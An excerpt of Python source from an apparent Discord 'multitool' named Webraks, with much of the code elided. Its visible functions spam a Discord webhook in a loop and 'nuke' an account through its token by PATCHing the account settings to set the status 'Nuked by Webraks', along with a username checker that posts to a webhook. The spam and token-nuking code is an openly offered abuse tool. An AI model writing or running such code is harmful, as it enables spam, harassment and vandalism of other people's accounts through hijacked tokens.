...
def _snd(url, d, m='POST'):
    try:
        ...
        r.add_header('User-Agent', 'Webraks_Wired/1.0')
...
def webhook_spam(url, msg, amt=10):
    cl = Theme.get_colors()
    print("\n  [+] Initializing spam...") 
    sc, p = 0, {"content": msg, "username": "Webraks@Multitool", "avatar_url": "https://i.ibb.co/Wv94YGVx/webraks.png"}
    for i in range(amt):
        st = _snd(url, p)
        if st in [200, 204]:
...
def token_nuker(tk):
    ...
    def _run():
        ...
        time.sleep(1)
        print(Colorate.Horizontal(cl["head"], "\n  [ PHASE 4 ] Finalizing..."))
        _req("PATCH", "https://discord.com/api/v9/users/@me/settings", {"theme": "light", "locale": "ja", "custom_status": {"text": "Nuked by Webraks"}}, "Set Final White/JP Mode")
...
def discord_username_checker():
    ...
    while True:
        ...
        choice = get_inpt("webraks@username_checker:~# ").strip()
            ...
            def send_webhook(username):
                ...
                payload = {
                    ...
                    "embeds": [{
                        ...
                        "thumbnail": {"url": "https://i.ibb.co/Wv94YGVx/webraks.png"},
                        "footer": {
                            "text": "Webraks Multitool • https://github.com/w3br4ks/webraks-multitool",
                            "icon_url": "https://i.ibb.co/Wv94YGVx/webraks.png"
                        },
                    }]
                }
                with webhook_lock:
